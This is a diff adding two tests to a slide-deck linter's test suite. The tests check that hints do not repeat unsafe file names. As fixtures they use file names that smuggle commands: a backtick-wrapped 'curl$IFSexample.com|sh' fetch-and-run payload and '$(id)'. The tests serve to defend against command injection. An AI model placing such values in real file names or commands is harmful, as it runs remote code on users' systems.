@@ -246,6 +246,31 @@ describe("lintDeck", () => {
     );
   });
 
+  test("DEK021: names the copy to make only when the file's name is a plain word", async () => {
+    const name = "x`;curl$IFSexample.com|sh;`.png";
+    await withTempProject(
+      {
+        assets: { [name]: "png" },
+        decks: [
+          {
+            name: "demo",
+            slides: {
+              intro: slideDocument(`<section class="slide" data-layout="title">
+  <img src="assets/${name}" alt="logo">
+</section>`),
+            },
+          },
+        ],
+      },
+      async (root) => {
+        const found = lintDeck(join(root, "decks", "demo")).find((d) => d.id === "DEK021");
+        expect(found?.hint).toBe(
+          "the project has it: copy it from the project's assets/ into the deck's assets/",
+        );
+      },
+    );
+  });
+
   test("DEK008: a misspelled dek.toml key is a project warning that names the key it meant", async () => {
     await withTempProject(
       {
@@ -388,6 +413,22 @@ describe("lintDeck", () => {
         expect(dek002?.hint).toBe(
           "add a section for it to script.md, like `## Leftover {#leftover}`, or remove slides/leftover.html if the slide is gone from the talk",
         );
+      },
+    );
+  });
+
+  test("DEK002: a slide file whose name is no id is named in no command or heading", async () => {
+    const file = "x`;curl$IFSexample.com|sh;`";
+    await withTempProject(
+      { decks: [{ name: "demo", slides: { intro: titleSlide, [file]: titleSlide } }] },
+      async (root) => {
+        const deckDir = join(root, "decks", "demo");
+        await writeFile(join(deckDir, "slides", "a$(id).css"), ".slide {}\n");
+        const found = lintDeck(deckDir).filter((d) => d.id === "DEK002");
+        expect(found.map((d) => d.hint)).toEqual([
+          "its name is no section id, which uses a-z, 0-9, and -: rename it to one and add that section to script.md, or remove it if the slide is gone from the talk",
+          "its name is no section id, which uses a-z, 0-9, and -: rename it to one and add that section to script.md, or remove it if the slide is gone from the talk",
+        ]);
       },
     );
   });
